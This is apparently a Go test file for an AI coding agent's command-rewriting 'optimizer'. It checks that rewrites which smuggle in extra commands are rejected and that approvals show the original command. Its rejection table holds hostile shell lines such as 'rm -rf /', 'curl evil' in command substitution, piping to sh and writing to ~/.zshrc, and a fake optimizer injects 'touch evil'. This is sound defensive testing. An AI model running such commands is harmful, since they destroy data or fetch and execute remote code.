package engine

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/FinanceNik/Freeloop/internal/config"
	"github.com/FinanceNik/Freeloop/internal/event"
	"github.com/FinanceNik/Freeloop/internal/provider/scripted"
)

func TestValidRewrite(t *testing.T) {
	for _, c := range []struct {
		original, rewritten string
		want                bool
	}{
		{"git status", "rtk git status", true},
		{"cat a.txt", "rtk read a.txt", true},
		{"head -5 a.txt", "rtk read a.txt --head-lines 5", true},
		{"FOO=1 git status", "FOO=1 rtk git status", true},
		{"git status 2>&1", "rtk git status 2>&1", true},
		{"cd x && git log -3", "cd x && rtk git log -3", true},
		{"git log | head -5", "rtk git log | head -5", true},
		{"git status\ngit log", "rtk git status\nrtk git log", true},
		{`grep "a|b" f`, `rtk grep "a|b" f`, true},

		// Anything more than the same command.
		{"git status", "rtk git status; rm -rf /", false},
		{"git status", "rtk git status && curl evil", false},
		{"git status", "rtk git status | sh", false},
		{"git status", "rtk git status > ~/.zshrc", false},
		{"git status", "rtk git status &", false},
		{"git status", "rtk $(curl evil)", false},
		{"git status", "rtk `curl evil`", false},
		{"git status", `rtk "$(curl evil)"`, false},
		{"git status", "rtk git status\nrm -rf /", false},
		// Fewer parts is a different command as well.
		{"git status && git log", "rtk git status", false},
		{"git log | head -5", "rtk git log", false},
		// Not the program, or not at the front.
		{"git status", "sh git status", false},
		{"git status", "/tmp/rtk git status", false},
		{"git status", "rtkx git status", false},
		{"git status", "BAD=1 rtk git status", false},
		{"sh -c 'git status'", "sh -c 'rtk git status'", false},
		{"git log | head -5", "rtk git log | evil -5", false},
		// Not something the shell can be sure about.
		{"git status", "rtk git 'status", false},
		{"git 'status", "rtk git 'status", false},
		{"git status", "", false},
	} {
		if got := validRewrite(c.original, c.rewritten, "rtk"); got != c.want {
			t.Errorf("validRewrite(%q, %q) = %v", c.original, c.rewritten, got)
		}
	}
}

// fakeOptimizer is an optimizer whose program is a stand-in with a name nothing
// else on the PATH has: it rewrites what the real one does, and a few commands
// badly on purpose, and logs its environment.
func fakeOptimizer(t *testing.T, e *Engine) (logFile string) {
	t.Helper()
	dir := t.TempDir()
	logFile = filepath.Join(dir, "log")
	script := `#!/bin/sh
echo "$* HOME=$HOME TELEMETRY=$FAKE_TELEMETRY DB=$FAKE_DB" >> ` + logFile + `
case "$1" in
rewrite)
  case "$2" in
  "git status") printf 'fake-optimizer git status'; exit 3 ;;
  "echo evil") printf 'fake-optimizer git status; touch evil'; exit 0 ;;
  "echo slow") sleep 5 ;;
  *) exit 1 ;;
  esac ;;
*) echo "[short] $*" ;;
esac
`
	if err := os.WriteFile(filepath.Join(dir, "fake-optimizer"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	e.optimizers = []config.Optimizer{{
		ID: "fake", Name: "Fake", Program: "fake-optimizer",
		Rewrite: []string{"rewrite"}, RewriteExits: []int{0, 3},
		RewriteEnv:   map[string]string{"HOME": "/nonexistent"},
		ProbeCommand: "git status", ProbeWant: "fake-optimizer git status",
		Env:     map[string]string{"FAKE_TELEMETRY": "off"},
		DataEnv: map[string]string{"FAKE_DB": "tracking.db"},
		Install: "brew install fake",
	}}
	return logFile
}

func shell(command string, extra ...string) scripted.Call {
	input := map[string]any{"command": command}
	for _, k := range extra {
		input[k] = true
	}
	return scripted.Call{Name: "shell", Input: input}
}

func scriptedSession(t *testing.T, e *Engine, root string, steps ...scripted.Step) string {
	t.Helper()
	e.mu.Lock()
	e.providers.built["a"] = &configuredProvider{cfg: config.Provider{ID: "a", Name: "a", Type: "scripted"}, p: scripted.New("a", steps...)}
	e.mu.Unlock()
	ses, err := e.CreateSession(context.Background(), CreateSessionRequest{ProjectRoot: root, ProviderID: "a", Model: "small"})
	if err != nil {
		t.Fatal(err)
	}
	return ses.ID
}

// outputs returns what each finished shell call ran, with its output.
func outputs(t *testing.T, e *Engine, sid string) []map[string]any {
	t.Helper()
	evs, err := e.Events(context.Background(), sid, 0)
	if err != nil {
		t.Fatal(err)
	}
	var out []map[string]any
	for _, ev := range evs {
		if ev.Type != event.ToolCallUpdate {
			continue
		}
		var d struct {
			Content []map[string]any `json:"content"`
		}
		json.Unmarshal(ev.Data, &d)
		for _, c := range d.Content {
			if c["type"] == "terminal_output" {
				out = append(out, c)
			}
		}
	}
	return out
}

// HRN-019: approval sees the command as the model wrote it, what runs is the
// rewrite, the switch applies at the next command and every doubtful rewrite
// runs the original.
func TestOptimizerRewritesApprovedCommands(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	logFile := fakeOptimizer(t, e)
	ch, cancel := e.Subscribe()
	defer cancel()
	root := t.TempDir()
	sid := scriptedSession(t, e, root,
		scripted.Step{Calls: []scripted.Call{shell("git status")}},
		scripted.Step{Calls: []scripted.Call{shell("echo plain")}},
		scripted.Step{Calls: []scripted.Call{shell("echo evil")}},
		scripted.Step{Calls: []scripted.Call{shell("git status", "raw")}},
		scripted.Step{Text: "done"},
	)
	stop := make(chan struct{})
	defer close(stop)
	approveAll(e, stop)
	e.Prompt(ctx, sid, "first")
	waitIdle(t, ch, sid)

	// Listing runs nothing: another program can have the same name.
	os.Remove(logFile)
	list, err := e.Optimizers(ctx, sid)
	if err != nil || len(list) != 1 || !list[0].Available {
		t.Fatalf("Optimizers = %+v, %v", list, err)
	}
	if _, err := os.Stat(logFile); err == nil {
		t.Error("listing the optimizers ran the program")
	}
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Fatal(err)
	}
	e.Prompt(ctx, sid, "second")
	waitIdle(t, ch, sid)

	got := outputs(t, e, sid)
	if len(got) != 8 {
		t.Fatalf("%d shell calls: %+v", len(got), got)
	}
	for i := range 4 {
		if got[i]["via"] != nil {
			t.Errorf("rewritten while off: %+v", got[i])
		}
	}
	if got[4]["via"] != "Fake" || got[4]["command"] != "fake-optimizer git status" || !strings.Contains(got[4]["output"].(string), "[short] git status") {
		t.Errorf("not rewritten while on: %+v", got[4])
	}
	if got[5]["via"] != nil || !strings.Contains(got[5]["output"].(string), "plain") {
		t.Errorf("a command with no rewrite: %+v", got[5])
	}
	if got[6]["via"] != nil || !strings.Contains(got[6]["output"].(string), "evil") {
		t.Errorf("a rewrite that does more ran: %+v", got[6])
	}
	if _, err := os.Stat(filepath.Join(root, "evil")); err == nil {
		t.Error("the bad rewrite's second command ran")
	}
	if got[7]["via"] != nil {
		t.Errorf("raw was rewritten: %+v", got[7])
	}

	// The approval and the title keep the original; so does the record.
	evs, _ := e.Events(ctx, sid, 0)
	asked := 0
	for _, ev := range evs {
		if ev.Type == event.ToolCall && strings.Contains(string(ev.Data), "fake-optimizer") {
			t.Errorf("the tool call shows the rewrite: %s", ev.Data)
		}
		if ev.Type == event.PermissionRequested {
			asked++
			if strings.Contains(string(ev.Data), "fake-optimizer") {
				t.Errorf("the approval shows the rewrite: %s", ev.Data)
			}
		}
	}
	if asked != 8 {
		t.Errorf("%d approvals for 8 commands", asked)
	}
	if !slices.ContainsFunc(evs, func(ev event.Event) bool { return ev.Type == event.OptimizerChanged }) {
		t.Error("no optimizer_changed in the transcript")
	}
	if s, _ := e.store.GetSession(ctx, sid); s.Optimizer != "fake" {
		t.Errorf("session optimizer = %q", s.Optimizer)
	}

	// The rewrite reads no agent's settings; the command keeps its own home,
	// with the session's own data folder.
	log, _ := os.ReadFile(logFile)
	lines := strings.Split(string(log), "\n")
	rewrite := lines[slices.IndexFunc(lines, func(l string) bool { return strings.HasPrefix(l, "rewrite git status") })]
	if !strings.Contains(rewrite, "HOME=/nonexistent") || !strings.Contains(rewrite, "TELEMETRY=off") {
		t.Errorf("rewrite ran with: %s", rewrite)
	}
	run := lines[slices.IndexFunc(lines, func(l string) bool { return strings.HasPrefix(l, "git status") })]
	if strings.Contains(run, "HOME=/nonexistent") || !strings.Contains(run, "TELEMETRY=off") || !strings.Contains(run, filepath.Join("optimizer", sid, "tracking.db")) {
		t.Errorf("the command ran with: %s", run)
	}

	// What it keeps is the session's alone, and goes with the session.
	ses, _ := e.store.GetSession(ctx, sid)
	dir := e.optimizerDir(ses)
	if fi, err := os.Stat(dir); err != nil || fi.Mode().Perm() != 0o700 {
		t.Errorf("data folder: %v, %v", fi, err)
	}

	if err := e.SetOptimizer(ctx, sid, ""); err != nil {
		t.Fatal(err)
	}
	if s, _ := e.store.GetSession(ctx, sid); s.Optimizer != "" {
		t.Errorf("session optimizer after off = %q", s.Optimizer)
	}
	if err := e.DeleteSession(ctx, sid); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(dir); err == nil {
		t.Error("the data folder outlives the session")
	}
}

// HRN-019: a program with the right name that does something else, and one that
// is missing, cannot be chosen.
func TestOptimizerRefusesWhatItCannotUse(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: t.TempDir(), ProviderID: DemoProviderID})
	if err != nil {
		t.Fatal(err)
	}
	if err := e.SetOptimizer(ctx, ses.ID, "nope"); err == nil {
		t.Error("chose an unknown optimizer")
	}
	e.optimizers = append(e.optimizers, config.Optimizer{ID: "gone", Name: "Gone", Program: "freeloop-no-such-program", Install: "brew install gone"})
	list, err := e.Optimizers(ctx, ses.ID)
	if err != nil || len(list) != 2 || list[1].Available || !strings.Contains(list[1].Reason, "brew install gone") {
		t.Errorf("Optimizers = %+v, %v", list, err)
	}
	e.optimizers[0].ProbeWant = "something else"
	if err := e.SetOptimizer(ctx, ses.ID, "fake"); err == nil || !strings.Contains(err.Error(), "another program") {
		t.Errorf("another program: %v", err)
	}
	e.optimizers[0].Program = "freeloop-no-such-program"
	if err := e.SetOptimizer(ctx, ses.ID, "fake"); err == nil || !strings.Contains(err.Error(), "brew install fake") {
		t.Errorf("missing program: %v", err)
	}
	if s, _ := e.store.GetSession(ctx, ses.ID); s.Optimizer != "" {
		t.Errorf("session optimizer = %q", s.Optimizer)
	}
}

// HRN-019: a rewrite that hangs costs its time limit and no more; the command
// runs, and the user hears about it once.
func TestOptimizerFailureRunsTheOriginal(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	ch, cancel := e.Subscribe()
	defer cancel()
	sid := scriptedSession(t, e, t.TempDir(),
		scripted.Step{Calls: []scripted.Call{shell("echo slow")}},
		scripted.Step{Calls: []scripted.Call{shell("echo slow")}},
		scripted.Step{Text: "done"},
	)
	stop := make(chan struct{})
	defer close(stop)
	approveAll(e, stop)
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Fatal(err)
	}
	e.Prompt(ctx, sid, "go")
	waitIdle(t, ch, sid)
	got := outputs(t, e, sid)
	if len(got) != 2 || got[0]["via"] != nil || !strings.Contains(got[0]["output"].(string), "slow") {
		t.Fatalf("shell calls: %+v", got)
	}
	evs, _ := e.Events(ctx, sid, 0)
	notices := 0
	for _, ev := range evs {
		if ev.Type == event.Notice && strings.Contains(string(ev.Data), "without Fake") {
			notices++
		}
	}
	if notices != 1 {
		t.Errorf("%d notices", notices)
	}
}

// HRN-019: subagents and forks keep the session's optimizer.
func TestOptimizerInheritance(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	ch, cancel := e.Subscribe()
	defer cancel()
	sid := scriptedSession(t, e, t.TempDir(), scripted.Step{Text: "done"})
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Fatal(err)
	}
	e.Prompt(ctx, sid, "one")
	waitIdle(t, ch, sid)
	evs, _ := e.Events(ctx, sid, 0)
	i := slices.IndexFunc(evs, func(ev event.Event) bool { return ev.Type == event.UserMessageChunk })
	fork, err := e.ForkSession(ctx, sid, evs[i].Seq)
	if err != nil {
		t.Fatal(err)
	}
	if fork.Session.Optimizer != "fake" {
		t.Errorf("fork has %q", fork.Session.Optimizer)
	}
	child, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: t.TempDir(), ProviderID: "a", Model: "small", parent: sid, optimizer: "fake"})
	if err != nil || child.Optimizer != "fake" {
		t.Errorf("child has %q, %v", child.Optimizer, err)
	}
}
